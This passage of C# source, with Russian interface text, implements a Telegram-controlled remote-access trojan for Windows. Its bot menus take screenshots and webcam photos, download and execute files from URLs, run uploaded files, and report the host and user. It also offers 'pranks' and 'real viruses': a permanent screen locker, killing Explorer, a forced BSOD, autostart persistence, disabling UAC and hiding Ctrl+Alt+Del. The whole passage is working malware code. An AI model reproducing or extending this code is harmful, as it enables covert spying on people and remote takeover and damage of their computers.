            return "🛠 <b>ПУЛЬТ · 👤 " + HtmlEscape(who) + "</b>\n" +
                   "🖥 " + now + " · жду команду\n" +
                   "Выбери, что сделать 👇";
        }

        public static string MenuKb()
        {
            return Api.Kb(
                Api.Row("📸 Скриншот", "shot", "📊 Статус", "status"),
                Api.Row("🎥 Вебка", "webcam", "🚀 Запустить файл", "run"),
                Api.Row("📥 Скачать по ссылке", "dl", "📤 Загрузить файл", "upload"),
                Api.Row("🌆 Обои с фото", "wallpaper", "😂 Шутки", "jokes"),
                Api.Row("😈 Приколы", "pranks"),
                Api.Row("🛰 Сменить хоста", "whoami"));
        }

        public static string JokeKb()
        {
            return Api.Kb(Api.Row("🎲 Случайная шутка", "joke"), Api.Row("⬅️ Меню", "main"));
        }

        public static string PranksKb()
        {
            return Api.Kb(
                Api.Row("🪟 Экран и окна", "cat_screen", "🖱 Периферия", "cat_mouse"),
                Api.Row("🖥 Стол и темы", "cat_desktop", "🔊 Звук", "cat_sound"),
                Api.Row("🏴 Жёсткие (18+)", "cat_hard", "💀 КОМБО", "cat_combo"),
                Api.Row("🙈 Система-шутки", "cat_sys", "☠️ ВИРУСЫ (настоящие)", "cat_virus"),
                Api.Row("⬅️ Меню", "main"));
        }

        private static string CatScreenKb()
        {
            return Api.Kb(
                Api.Row("🖥 БСОД", "pr_bsod", "💾 Фейк-апдейт", "pr_update"),
                Api.Row("🎵 Рикролл", "pr_rick", "🖼 Экран наизнанку", "pr_invert"),
                Api.Row("🖥 Блэк-аут", "pr_blackout", "📱 Экран выкл", "pr_monoff"),
                Api.Row("🔄 Экран на 90°", "pr_rotate", "🪟 Стол фликер", "pr_flicker"),
                Api.Row("🪟 Танцующее окно", "pr_dance", "⬅️ Приколы", "pranks"));
        }

        private static string CatMouseKb()
        {
            return Api.Kb(
                Api.Row("🍕 Флуд cmd", "floodcmd", "💬 Окон-бомба", "floodpop"),
                Api.Row("🌀 Мышь пьяная", "flooddrunk", "🧲 Мышь к центру", "pr_magnet"),
                Api.Row("🧲 Мышь от углов", "pr_edges", "🔒 Курсор в клетке", "pr_jail"),
                Api.Row("🙃 Мышь swap", "pr_swap", "💿 CDROM — открой!", "pr_cd"),
                Api.Row("⛔ Стоп безумия", "stopflood", "⬅️ Приколы", "pranks"));
        }

        private static string CatDesktopKb()
        {
            return Api.Kb(
                Api.Row("🖼 Значки убрать/вернуть", "pr_icons", "🌆 Обои = скриншот", "pr_wallsub"),
                Api.Row("🖼 Обои «Я ВСЁ ВИЖУ»", "pr_wallstare", "🧷 Вернуть обои", "pr_wallback"),
                Api.Row("🗒 Блокнот-прикол", "pr_notepad", "⬅️ Приколы", "pranks"));
        }

        private static string CatSoundKb()
        {
            return Api.Kb(
                Api.Row("🎵 Мелодия спикера", "pr_beep", "🎺 Сирена 15с", "pr_siren"),
                Api.Row("🗣 Голос из ниоткуда", "pr_voice", "🔊 Громкость MAX", "pr_volume"),
                Api.Row("⌨️ Caps-стрекот", "pr_caps", "▶️ Плеер дёргать", "pr_player"),
                Api.Row("⬅️ Приколы", "pranks"));
        }

        private static string CatHardKb()
        {
            return Api.Kb(
                Api.Row("🏴 WINLOCKER", "pr_winlock", "🧨 Театр format C:", "pr_format"),
                Api.Row("👁 Хакер-взлом", "pr_hacker", "🔋 Заряд 1%", "pr_battery"),
                Api.Row("🚨 Скример", "pr_screamer", "🖥 Блок ПК", "pr_lock"),
                Api.Row("💬 Сарказм ×5", "pr_msgbox", "⬅️ Приколы", "pranks"));
        }

        private static string CatComboKb()
        {
            return Api.Kb(
                Api.Row("☠️ Конец света (КОМБО)", "pr_apocalypse"),
                Api.Row("💀 СУДНАЯ НОЧЬ 2.0", "pr_judgment"),
                Api.Row("⬅️ Приколы", "pranks"));
        }

        private static string CatSysKb()
        {
            return Api.Kb(
                Api.Row("🙈 Спрятать Ctrl+Alt+Del", "pr_hkhide", "🙈 Вернуть", "pr_hkshow"),
                Api.Row("🔒 UAC OFF", "pr_uacoff", "🔓 UAC ON", "pr_uacon"),
                Api.Row("⬅️ Приколы", "pranks"));
        }

        private static string CatVirusKb()
        {
            return Api.Kb(
                Api.Row("🏴 ВИНЛОКЕР НАВСЕГДА", "vr_winlock", "🗑 УБИТЬ ПРОВОДНИКА", "vr_explorer"),
                Api.Row("🖼 ОБОИ-МОГИЛА", "vr_wall", "🔒 МЫШЬ-ЗАЛОЖНИК", "vr_trap"),
                Api.Row("🌀 ВЕЧНОЕ БЕЗУМИЕ", "vr_madness", "💀 БСОД НАСТОЯЩИЙ", "vr_bsod"),
                Api.Row("♻️ АВТОЗАПУСК ВКЛ", "vr_persist", "♻️ АВТОЗАПУСК ВЫКЛ", "vr_nopersist"),
                Api.Row("📊 Статус", "vr_status", "🧨 ПУЛЕВОЕ УБИЙСТВО", "vr_panic"),
                Api.Row("🆘 Снять всё", "vr_off", "⬅️ Приколы", "pranks"));
        }

        private static readonly Dictionary<string, string> CAT_TITLES = new Dictionary<string, string>();
        private static readonly Dictionary<string, Func<string>> CAT_KB = new Dictionary<string, Func<string>>();
        private static readonly Dictionary<string, string> VR_TITLES = new Dictionary<string, string>();
        private static readonly Dictionary<string, string> LOOP_TITLES = new Dictionary<string, string>();
        private static readonly Dictionary<string, string> PrankHome = new Dictionary<string, string>();
        private static readonly Dictionary<string, Func<string>> TASKS = new Dictionary<string, Func<string>>();
        private static bool _built = false;

        public static void BuildTables()
        {
            if (_built) return;
            _built = true;
            CAT_TITLES["cat_screen"] = "🪟 ЭКРАН И ОКНА";
            CAT_TITLES["cat_mouse"] = "🖱 ПЕРИФЕРИЯ";
            CAT_TITLES["cat_desktop"] = "🖥 СТОЛ И ТЕМЫ";
            CAT_TITLES["cat_sound"] = "🔊 ЗВУК";
            CAT_TITLES["cat_hard"] = "🏴 ЖЁСТКИЕ (18+)";
            CAT_TITLES["cat_combo"] = "💀 КОМБО-КОШМАР";
            CAT_TITLES["cat_sys"] = "🙈 СИСТЕМА-ШУТКИ";
            CAT_TITLES["cat_virus"] = "☠️ НАСТОЯЩИЕ ВИРУСЫ";
            CAT_KB["cat_screen"] = CatScreenKb;
            CAT_KB["cat_mouse"] = CatMouseKb;
            CAT_KB["cat_desktop"] = CatDesktopKb;
            CAT_KB["cat_sound"] = CatSoundKb;
            CAT_KB["cat_hard"] = CatHardKb;
            CAT_KB["cat_combo"] = CatComboKb;
            CAT_KB["cat_sys"] = CatSysKb;
            CAT_KB["cat_virus"] = CatVirusKb;
            VR_TITLES["vr_winlock"] = "🏴 ВИНЛОКЕР НАВСЕГДА";
            VR_TITLES["vr_explorer"] = "🗑 УБИТЬ ПРОВОДНИКА";
            VR_TITLES["vr_wall"] = "🖼 ОБОИ-МОГИЛА";
            VR_TITLES["vr_trap"] = "🔒 МЫШЬ-ЗАЛОЖНИК";
            VR_TITLES["vr_madness"] = "🌀 ВЕЧНОЕ БЕЗУМИЕ";
            VR_TITLES["vr_status"] = "📊 Статус вирусов";
            VR_TITLES["vr_panic"] = "🧨 ПУЛЕВОЕ УБИЙСТВО";
            VR_TITLES["vr_persist"] = "♻️ АВТОЗАПУСК ВКЛ";
            VR_TITLES["vr_nopersist"] = "♻️ АВТОЗАПУСК ВЫКЛ";
            VR_TITLES["vr_off"] = "🆘 Снять всё";
            LOOP_TITLES["floodcmd"] = "🍕 Флуд cmd";
            LOOP_TITLES["floodpop"] = "💬 Окон-бомба";
            LOOP_TITLES["flooddrunk"] = "🌀 Мышь пьяная";
            TASKS["pr_bsod"] = Pr.Bsod;            TASKS["pr_update"] = Pr.UpdateFake;
            TASKS["pr_rick"] = Pr.Rickroll;        TASKS["pr_invert"] = Pr.Invert;
            TASKS["pr_blackout"] = Pr.Blackout;    TASKS["pr_monoff"] = Pr.Monoff;
            TASKS["pr_rotate"] = Pr.RotateDisplay; TASKS["pr_flicker"] = Pr.Flicker;
            TASKS["pr_dance"] = Pr.Dance;          TASKS["pr_magnet"] = Pr.Magnet;
            TASKS["pr_edges"] = Pr.Edges;          TASKS["pr_jail"] = Pr.Jail;
            TASKS["pr_swap"] = Pr.MouseToggle;     TASKS["pr_cd"] = Pr.Cd;
            TASKS["pr_icons"] = Pr.IconsToggle;    TASKS["pr_wallsub"] = Pr.WallSub;
            TASKS["pr_wallstare"] = Pr.WallStare;  TASKS["pr_wallback"] = Pr.WallBack;
            TASKS["pr_notepad"] = Pr.Notepad;      TASKS["pr_beep"] = Pr.Beep;
            TASKS["pr_siren"] = Pr.Siren;          TASKS["pr_voice"] = Pr.Voice;
            TASKS["pr_volume"] = Pr.Volume;        TASKS["pr_caps"] = Pr.Caps;
            TASKS["pr_player"] = Pr.Player;        TASKS["pr_winlock"] = Pr.Winlock;
            TASKS["pr_format"] = Pr.Format;        TASKS["pr_hacker"] = Pr.Hacker;
            TASKS["pr_battery"] = Pr.Battery;      TASKS["pr_screamer"] = Pr.Screamer;
            TASKS["pr_lock"] = Pr.PcLock;          TASKS["pr_msgbox"] = Pr.Msgbox;
            TASKS["pr_apocalypse"] = Pr.Apocalypse; TASKS["pr_judgment"] = Pr.Judgment;
            TASKS["pr_hkhide"] = Pr.HideCad;       TASKS["pr_hkshow"] = Pr.ShowCad;
            TASKS["pr_uacoff"] = delegate { return Pr.UacSet(0); };
            TASKS["pr_uacon"] = delegate { return Pr.UacSet(1); };
            TASKS["vr_winlock"] = Virus.DeployWinlock;   TASKS["vr_explorer"] = Virus.DeployExplorer;
            TASKS["vr_wall"] = Virus.DeployWall;         TASKS["vr_trap"] = Virus.DeployTrap;
            TASKS["vr_madness"] = Virus.DeployMadness;   TASKS["vr_status"] = Virus.StatusText;
            TASKS["vr_persist"] = Virus.PersistOn;       TASKS["vr_nopersist"] = Virus.PersistOff;
            TASKS["vr_off"] = Virus.KillAll;             TASKS["vr_panic"] = Virus.Panic;
        }

        /// <summary>тап → своя категория (как python-шный PRANK_HOME, собирается из меню)</summary>
        public static void BuildPrankHome()
        {
            lock (PrankHome) PrankHome.Clear();
            foreach (KeyValuePair<string, Func<string>> kv in CAT_KB)
            {
                object parsed = null;
                try { parsed = Api.J.DeserializeObject(kv.Value()); } catch { continue; }
                List<object> outer = parsed as List<object>;
                if (outer == null) continue;
                foreach (object rowo in outer)
                {
                    List<object> row = rowo as List<object>;
                    if (row == null) continue;
                    foreach (object but in row)
                    {
                        Dictionary<string, object> b = but as Dictionary<string, object>;
                        if (b == null) continue;
                        object d;
                        if (!b.TryGetValue("callback_data", out d)) continue;
                        string data = d as string;
                        if (data == null || data == "pranks" || data == "main") continue;
                        lock (PrankHome) PrankHome[data] = kv.Key;
                    }
                }
            }
        }

        public static string PickText()
        {
            return "🛰 <b>ХОСТЫ ЭТОГО ПУЛЬТА</b>\n" +
                   "хост — машина, где запущен скрипт. тапни — панель будет его колбасить.\n" +
                   "если машин несколько: каждый свой токен на своей машине, все боты —\n" +
                   "в одну группу; каждый держит СВОЮ панель, /menu боится только чата";
        }

        public static string PickKb()
        {
            List<string[]> rows = new List<string[]>();
            rows.Add(Api.Row("🛰 " + TitleFor(K.HostLabel()), "hostsel:" + K.HostLabel()));
            foreach (string n in K.HOST_TITLES.Keys)
            {
                if (n == K.HostLabel()) continue;
                rows.Add(Api.Row("🛰 " + K.HOST_TITLES[n], "hostsel:" + n));
            }
            rows.Add(Api.Row("⬅️ Панель", "main"));
            return Api.Kb(rows.ToArray());
        }

        public static bool Allowed(long uid)
        {
            foreach (long id in K.ALLOWED_IDS) if (id == uid) return true;
            return false;
        }

        // ---------- панель ----------
        public static void SetPanel(long chat, string text, string kb)
        {
            long mid = 0;
            lock (K.Panel) { K.Panel.TryGetValue(chat, out mid); }
            if (mid > 0 && Api.Edit(chat, mid, text, kb, true)) return;
            mid = Api.SendMsg(chat, text, kb, true, 0);
            if (mid > 0) lock (K.Panel) { K.Panel[chat] = mid; }
        }

        public static void SendMenu(long chat) { SetPanel(chat, MenuText(chat), MenuKb()); }

        public static void StartFor(long chat)
        {
            lock (K.Sess) { string v; if (!K.Sess.TryGetValue(chat, out v)) K.Sess[chat] = K.HostLabel(); }
            SendMenu(chat);
        }

        public static bool BusyEnter(string jid)
        {
            lock (K.BusyLock)
            {
                if (K.Busy.Contains(jid)) return true;
                K.Busy.Add(jid);
                return false;
            }
        }
        public static void BusyExit(string jid) { lock (K.BusyLock) { K.Busy.Remove(jid); } }

        private static readonly BlockingCollection<Action> Rescue = new BlockingCollection<Action>();
        public static void RescuerLoop()
        {
            foreach (Action a in Rescue.GetConsumingEnumerable())
            {
                try { a(); } catch (Exception e) { K.Log("rescue fail: " + e.Message); }
            }
        }

        private static void RestoreCat(long chat, long mid, string data)
        {
            string cat;
            lock (PrankHome) { if (!PrankHome.TryGetValue(data, out cat)) cat = null; }
            Func<string> mk;
            string title;
            if (cat == null || !CAT_KB.TryGetValue(cat, out mk) || !CAT_TITLES.TryGetValue(cat, out title))
            {
                SendMenu(chat);
                return;
            }
            Api.Edit(chat, mid, title + "\nпредыдущий улетел — тапай следующий", mk(), false);
        }

        private static void RunThreadPrank(long chat, long mid, string data)
        {
            Func<string> fn;
            if (!TASKS.TryGetValue(data, out fn)) return;
            string title;
            if (!VR_TITLES.TryGetValue(data, out title)) title = data;
            if (BusyEnter(title))
            {
                Api.Send(chat, "уже крутится (" + title + "), не повторяй");
                RestoreCat(chat, mid, data);
                return;
            }
            Api.Edit(chat, mid, "🚀 <b>" + title + "</b> — запускаю", null, true);
            Action dispatch = delegate
            {
                string result = null;
                try { result = fn(); }
                catch (Exception e) { result = "❌ шутка сорвалась: " + e.Message; }
                if (result != null) Api.Send(chat, result);
                BusyExit(title);
                RestoreCat(chat, mid, data);
            };
            if (data == "vr_off" || data == "vr_panic")
            {
                Rescue.Add(dispatch);
            }
            else
            {
                ThreadPool.QueueUserWorkItem(delegate { dispatch(); });
            }
        }
    }
    // ============================================================
    //  бот: роутинг колбеков/текстов/файлов
    // ============================================================
    internal static partial class Bot
    {
        private static string PendGet(long uid) { lock (K.PendLock) { string v; return K.Pend.TryGetValue(uid, out v) ? v : null; } }
        private static void PendDel(long uid) { lock (K.PendLock) { K.Pend.Remove(uid); } }
        private static void PendSet(long uid, string mode) { lock (K.PendLock) { K.Pend[uid] = mode; } }

        private static void Prompt(long chat, long mid, long uid, string mode, string text)
        {
            PendSet(uid, mode);
            Api.Edit(chat, mid, text, Api.Kb(Api.Row("✖️ Отмена", "cancel"), Api.Row("⬅️ Меню", "main")), true);
        }

        private static void FloodLoopDispatch(string data, long uid)
        {
            if (data == "floodcmd") Pr.FloodCmdLoop(uid);
            else if (data == "floodpop") Pr.FloodPopLoop(uid);
            else if (data == "flooddrunk") Pr.FloodDrunkLoop(uid);
        }

        private static void Shot(long chat, long mid)
        {
            try
            {
                using (Bitmap bmp = Fx.GrabAll())
                {
                    byte[] png = Fx.PngBytes(bmp);
                    Api.SendPhoto(chat, png, "screen.png", "image/png", "📸 готово");
                }
            }
            catch (Exception e)
            {
                Api.SendMsg(chat, "❌ скрин не вышел:\n<code>" + HtmlEscape(e.Message) + "</code>", null, true, 0);
            }
            SendMenu(chat);
        }

        private static void Webcam(long chat, long mid)
        {
            try
            {
                List<KeyValuePair<int, byte[]>> shots = Cam.Snapshot(5);
                if (shots.Count > 0)
                {
                    foreach (KeyValuePair<int, byte[]> kv in shots)
                        Api.SendPhoto(chat, kv.Value, "webcam_" + kv.Key + ".jpg", "image/jpeg", "🎥 вебка #" + kv.Key);
                    string extra = shots.Count == 1 ? "" : "\n🎥 всего камер: " + shots.Count;
                    Api.Send(chat, "🎥 снимок с вебки доставлен" + extra);
                    SendMenu(chat);
                }
            }
            catch (Exception e)
            {
                Api.Edit(chat, mid, "❌ вебка не снялась:\n<code>" + HtmlEscape(e.Message) + "</code>", null, true);
            }
        }

        public static string LaunchByPath(string fp)
        {
            if (!File.Exists(fp)) return "❌ файл не найден: " + fp;
            string ext = Path.GetExtension(fp).ToLower();
            if (ext == ".bat")
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c \"" + fp + "\"";
                psi.UseShellExecute = false;
                Process.Start(psi);
                return "🚀 .bat исполнен: " + fp;
            }
            ProcessStartInfo psi2 = new ProcessStartInfo();
            psi2.FileName = fp;
            psi2.UseShellExecute = true;
            Process.Start(psi2);
            return "🚀 запущено: " + fp;
        }

        public static void DownloadAndRun(long chat, string url)
        {
            string name = null;
            try
            {
                Uri u0 = new Uri(url);
                name = Path.GetFileName(u0.AbsolutePath);
            }
            catch { }
            if (string.IsNullOrEmpty(name)) name = "file_" + Guid.NewGuid().ToString("N").Substring(0, 8);
            string dst = Path.Combine(K.DATA_DIR, name);

            string cur = url;
            byte[] body = null;
            Exception lastErr = null;
            for (int hop = 0; hop < 6; hop++)
            {
                Uri u;
                try { u = new Uri(cur); }
                catch { throw new IOException("битая ссылка"); }
                int port = u.Port > 0 ? u.Port : (u.Scheme == "https" ? 443 : 80);
                bool tls = u.Scheme == "https";
                int st;
                try
                {
                    Dictionary<string, object> r = Tg.Fetch(u.Host, port, u.PathAndQuery, tls, out st);
                    if (r.ContainsKey("__redirect")) { cur = (string)r["__redirect"]; continue; }
                    body = (byte[])r["__body"];
                    if (st >= 400) throw new IOException("HTTP " + st);
                    lastErr = null;
                    break;
                }
                catch (Exception e) { lastErr = e; break; }
            }
            if (lastErr != null) throw lastErr;
            if (body == null || body.Length == 0)
            {
                Api.Send(chat, "❌ пусто на том конце — качалка не удалась");
                return;
            }
            File.WriteAllBytes(dst, body);
            Api.Send(chat, "💾 скачано " + string.Format("{0:N0}", body.Length) + " Б → " + dst + "\n🚀 пробую запустить");
            try { Api.Send(chat, LaunchByPath(dst)); }
            catch (Exception e) { Api.Send(chat, "💾 скачан, но не завёлся: " + e.Message); }
        }

        public static void HandleCb(Dictionary<string, object> upd)
        {
            Dictionary<string, object> cb = Api.D(upd, "callback_query") as Dictionary<string, object>;
            if (cb == null) return;
            long uid = Api.L(Api.D(Api.D(cb, "from"), "id"));
            Dictionary<string, object> msg = Api.D(cb, "message") as Dictionary<string, object>;
            long chat = msg != null ? Api.L(Api.D(Api.D(msg, "chat"), "id")) : 0;
            long mid = msg != null ? Api.L(Api.D(msg, "message_id")) : 0;
            string cbId = Api.S(Api.D(cb, "id"));
            string data = Api.S(Api.D(cb, "data"));
            if (!Allowed(uid)) { Api.AnswerCbAlert(cbId, "нет доступа"); return; }
            Api.AnswerCb(cbId);
            if (msg != null && mid > 0) { lock (K.Panel) { K.Panel[chat] = mid; } }

            if (data.StartsWith("hostsel:"))
            {
                string name = data.Substring(8);
                if (name == "self") name = K.HostLabel();
                if (name != K.HostLabel() && !K.HOST_TITLES.ContainsKey(name))
                {
                    Api.CallQ("answerCallbackQuery", "{\"callback_query_id\":" + Api.JsonStr(cbId) + ",\"text\":\"❌ такого пульта нет\",\"show_alert\":false}");
                    SetPanel(chat, PickText(), PickKb());
                    return;
                }
                lock (K.Sess) K.Sess[chat] = name;
                SetPanel(chat, MenuText(chat), MenuKb());
                return;
            }
            if (data == "whoami") { SetPanel(chat, PickText(), PickKb()); return; }
            if (data == "main") { Api.Edit(chat, mid, MenuText(chat), MenuKb(), true); return; }
            if (data == "shot") { Shot(chat, mid); return; }
            if (data == "webcam") { Webcam(chat, mid); return; }
            if (data == "status")
            {
                Api.Edit(chat, mid, StatusText(), Api.Kb(Api.Row("⬅️ Меню", "main")), true);
                return;
            }
            if (data == "run") { Prompt(chat, mid, uid, "runfile", "🚀 <b>ЗАПУСК ФАЙЛА</b>\nнапиши в чат полный путь, например:\n<code>C:\\Users\\Пк\\файл.bat</code>"); return; }
            if (data == "dl") { Prompt(chat, mid, uid, "download", "📥 <b>СКАЧАТЬ И ЗАПУСТИТЬ</b>\nнапиши в чат прямую ссылку на файл (http/https) —\nскачаю через socks5 и запущу на пк сразу"); return; }
            if (data == "upload") { Prompt(chat, mid, uid, "upload", "📤 <b>ЗАГРУЗКА ФАЙЛА</b>\nприкрепи файл как <b>документ</b> в этот чат"); return; }
            if (data == "wallpaper") { Prompt(chat, mid, uid, "wallpaper", "🌆 <b>ОБОИ НА СВОЁ ФОТО</b>\nшли картинку в чат — встанет на рабочий стол"); return; }
            if (data == "jokes") { Api.Edit(chat, mid, "😂 <b>ШУТКИ</b>\nподними себе настроение — жми 🎲", JokeKb(), true); return; }
            if (data == "pranks") { Api.Edit(chat, mid, "😈 <b>ПРИКОЛЫ</b> — арсенал на все вкусы\nэкран / периферия / стол / звук / жёсткие / комбо / система", PranksKb(), true); return; }
            string catTitle;
            Func<string> catKb;
            if (CAT_TITLES.TryGetValue(data, out catTitle) && CAT_KB.TryGetValue(data, out catKb))
            {
                Api.Edit(chat, mid, catTitle, catKb(), true);
                return;
            }
            if (data == "joke")
            {
                int j = Rnd.Next(JOKES.Length);
                Api.SendMsg(chat, JOKES[j][0] + " <blockquote>" + HtmlEscape(JOKES[j][1]) + "</blockquote>", null, true, 0);
                return;
            }
            if (data == "floodcmd" || data == "floodpop" || data == "flooddrunk")
            {
                byte deadSlot; K.FloodStop.TryRemove(uid, out deadSlot);
                string lt;
                if (!LOOP_TITLES.TryGetValue(data, out lt)) lt = data;
                Api.Edit(chat, mid, lt + " летит, пока не тапнешь ⛔", null, false);
                long uid2 = uid;
                string data2 = data;
                Thread th = new Thread((ThreadStart)delegate { FloodLoopDispatch(data2, uid2); });
                th.IsBackground = true;
                th.Start();
                Api.SendMsg(chat, lt + " в разгаре…", Api.Kb(Api.Row("⛔ Стоп", "stopflood"), Api.Row("⬅️ Меню", "main")), false, 0);
                return;
            }
            if (data == "stopflood")
            {
                K.FloodStop[uid] = 1;
                Api.Edit(chat, mid, "🧹 безумие остановлено (странные окна снимите руками)", null, false);
                SendMenu(chat);
                return;
            }
            if (data == "vr_bsod")
            {
                Api.Edit(chat, mid, "💀 <b>БСОД НАСТОЯЩИЙ</b>\nкраш через 2 секунды — машина уйдёт в перезагрузку,\nнесохранённое сгорит, бот замолчит до конца ребута.\nпосле ребута всё чисто (♻️ автозапуск решает, вернётся ли вирусня)", null, true);
                Thread th = new Thread(Virus.BsodBg);
                th.IsBackground = true;
                th.Start();
                return;
            }
            Func<string> taskFn;
            if (TASKS.TryGetValue(data, out taskFn)) { RunThreadPrank(chat, mid, data); return; }
            if (data == "cancel")
            {
                PendDel(uid);
                Api.Edit(chat, mid, "🧹 сброшено", null, false);
                SendMenu(chat);
                return;
            }
        }

        public static void HandleMsg(Dictionary<string, object> upd)
        {
            Dictionary<string, object> msg = Api.D(upd, "message") as Dictionary<string, object>;
            if (msg == null) return;
            long uid = Api.L(Api.D(Api.D(msg, "from"), "id"));
            if (!Allowed(uid)) return;
            long chat = Api.L(Api.D(Api.D(msg, "chat"), "id"));
            long mid = Api.L(Api.D(msg, "message_id"));
            List<object> photo = Api.D(msg, "photo") as List<object>;
            if (photo != null) { PhotoMsg(chat, mid, uid, photo); return; }
            Dictionary<string, object> doc = Api.D(msg, "document") as Dictionary<string, object>;
            if (doc != null) { DocMsg(chat, mid, uid, doc); return; }
            string text = Api.S(Api.D(msg, "text")).Trim();
            if (text.Length > 0) TextMsg(chat, mid, uid, text);
        }

        private static void TextMsg(long chat, long mid, long uid, string text)
        {
            if (text == "/start" || text == "/menu" || text.StartsWith("/start@") || text.StartsWith("/menu@"))
            {
                StartFor(chat);
                return;
            }
            string pend = PendGet(uid);
            if (pend == "upload")
            {
                Api.SendMsg(chat, "жду документ 📤, не текст — в меню: 📤 Загрузить файл", null, false, mid);
                return;
            }
            if (pend == "wallpaper")
            {
                Api.SendMsg(chat, "жду картинку 🌆, не текст — в меню: 🌆 Обои с фото", null, false, mid);
                return;
            }
            PendDel(uid);
            if (pend == null)
            {
                SendMenu(chat);
                return;
            }
            if (text.Length == 0)
            {
                Api.SendMsg(chat, "пусто — набери заново", null, false, mid);
                return;
            }
            if (pend == "download")
            {
                string lower = text.ToLower();
                if (!lower.StartsWith("http://") && !lower.StartsWith("https://"))
                {
                    PendSet(uid, "download");
                    Api.SendMsg(chat, "❌ это не ссылка — нужно http…/https…", null, false, mid);
                    return;
                }
                int sl = text.IndexOf('/', text.IndexOf("://") + 3);
                string pathPart = sl >= 0 ? text.Substring(sl) : "/";
                if (!pathPart.Contains("."))
                {
                    PendSet(uid, "download");
                    Api.SendMsg(chat, "❌ в ссылке нет имени файла — качать нечего", null, false, mid);
                    return;
                }
                Api.SendMsg(chat, "⏳ качаю через немца…", null, false, mid);
                try { DownloadAndRun(chat, text); }
                catch (Exception e) { Api.SendMsg(chat, "❌ качалка сломалась: " + e.Message, null, false, 0); }
                SendMenu(chat);
                return;
            }
            if (pend == "runfile")
            {
                try { Api.SendMsg(chat, LaunchByPath(text), null, false, 0); }
                catch (Exception e) { Api.SendMsg(chat, "❌ не завелось: " + e.Message, null, false, mid); }
                SendMenu(chat);
                return;
            }
            Api.SendMsg(chat, "непонятный режим — тапни кнопку в меню", null, false, mid);
            SendMenu(chat);
        }

        private static void PhotoMsg(long chat, long mid, long uid, List<object> sizes)
        {
            if (PendGet(uid) != "wallpaper")
            {
                Api.SendMsg(chat, "фото пока не командую — обои ставятся из меню: 🌆 Обои с фото", null, false, mid);
                return;
            }
            PendDel(uid);
            object last = sizes.Count > 0 ? sizes[sizes.Count - 1] : null;
            string fileId = Api.S(Api.D(last, "file_id"));
            try
            {
                object meta = Api.GetFileMeta(fileId);
                if (meta == null) throw new IOException("getFile не вышел");
                string fp = Api.S(Api.D(meta, "file_path"));
                if (fp.Length == 0) throw new IOException("файл слишком большой");
                byte[] data = Api.GrabFile(fp);
                string dst = Path.Combine(K.DATA_DIR, "wallpaper.jpg");
                File.WriteAllBytes(dst, data);
                Api.SendMsg(chat, Pr.SetWallpaper(dst), null, false, mid);
            }
            catch (Exception e)
            {
                Api.SendMsg(chat, "❌ обои не встали: " + e.Message, null, false, mid);
            }
        }

        private static void DocMsg(long chat, long mid, long uid, Dictionary<string, object> doc)
        {
            if (doc == null) { Api.SendMsg(chat, "❌ жду файл-документ", null, false, mid); return; }
            string fileId = Api.S(Api.D(doc, "file_id"));
            string fname = Api.S(Api.D(doc, "file_name"));
            string mime = Api.S(Api.D(doc, "mime_type"));
            if (PendGet(uid) == "wallpaper")
            {
                if (mime.Length > 0 && !mime.StartsWith("image"))
                {
                    Api.SendMsg(chat, "это не картинка — обои только jpg/png", null, false, mid);
                    return;
                }
                PendDel(uid);
                try
                {
                    object meta = Api.GetFileMeta(fileId);
                    string fp = Api.S(Api.D(meta, "file_path"));
                    if (fp.Length == 0) throw new IOException("файл слишком большой");
                    byte[] data = Api.GrabFile(fp);
                    string dstPath = Path.Combine(K.DATA_DIR, fname.Length > 0 ? fname : "wallpaper");
                    File.WriteAllBytes(dstPath, data);
                    Api.SendMsg(chat, Pr.SetWallpaper(dstPath), null, false, mid);
                }
                catch (Exception e) { Api.SendMsg(chat, "❌ обои не встали: " + e.Message, null, false, mid); }
                return;
            }
            PendDel(uid);
            string dst = null;
            try
            {
                object meta = Api.GetFileMeta(fileId);
                string fp = Api.S(Api.D(meta, "file_path"));
                if (fp.Length == 0) throw new IOException("файл слишком большой");
                byte[] data = Api.GrabFile(fp);
                dst = Path.Combine(K.DATA_DIR, fname.Length > 0 ? fname : "doc_" + DateTime.Now.Ticks);
                File.WriteAllBytes(dst, data);
                Api.SendMsg(chat, "💾 сохранено: " + dst, null, false, mid);
            }
            catch (Exception e)
            {
                Api.SendMsg(chat, "❌ не сохранилось: " + e.Message, null, false, mid);
                return;
            }
            try { Api.SendMsg(chat, LaunchByPath(dst), null, false, 0); }
            catch (Exception e2) { Api.SendMsg(chat, "💾 сохранён, но не запущен: " + e2.Message, null, false, 0); }
        }

        public static string StatusText()
        {
            string now = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
            return "📊 <b>СТАТУС ПУЛЬТА</b>\n" +
                   "🖥 машина: <code>" + HtmlEscape(Environment.MachineName) + "</code>\n" +
                   "🪟 ось: " + WinName() + "\n" +
                   "👤 юзер: <code>" + HtmlEscape(Environment.UserName) + "</code>\n" +
                   "🧬 ядро: натив C# (.NET 4)\n" +
                   "🌍 сеть: socks5 на борту\n" +
                   "🕐 время: <code>" + now + "</code>";
        }
    }

    // ============================================================
    //  пуск
    // ============================================================
    internal static class Prog
    {
        private static bool AcquireLock()
        {
            try
            {
                Directory.CreateDirectory(K.DATA_DIR);
                FileStream fs = new FileStream(Path.Combine(K.DATA_DIR, "bot.lock"), FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
                try
                {
                    byte[] b = Encoding.ASCII.GetBytes(Process.GetCurrentProcess().Id.ToString());
                    fs.Write(b, 0, b.Length);
                }
                catch { }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static void Main(string[] args)
        {
            try { Console.OutputEncoding = Encoding.UTF8; } catch { }
            if (args.Length > 0 && args[0] == "--getme")
            {
                try
                {
                    object me = Api.Call("getMe", "{}");
                    Console.WriteLine("ок: @" + Api.S(Api.D(me, "username")) + " id=" + Api.L(Api.D(me, "id")));
                }
                catch (Exception e) { Console.WriteLine("getMe fail: " + e.Message); }
                return;
            }
            try { Directory.CreateDirectory(K.DATA_DIR); } catch { }
            if (!AcquireLock())
            {
                Console.WriteLine("пульт уже работает. эту копию закрываю; пользуйся работой первого окна.");
                Thread.Sleep(2000);
                return;
            }
            N.SetProcessDPIAware();
            Bot.BuildTables();
            Bot.BuildPrankHome();
            Thread rescuer = new Thread(Bot.RescuerLoop);
            rescuer.IsBackground = true;
            rescuer.Start();
            K.Log("бот в работе (прокси: True)");

            long offset = -1;
            bool flushed = false;
            while (true)
            {
                if (!flushed)
                {
                    try
                    {
                        object first = Api.Call("getUpdates", "{\"offset\":-1,\"timeout\":0}");
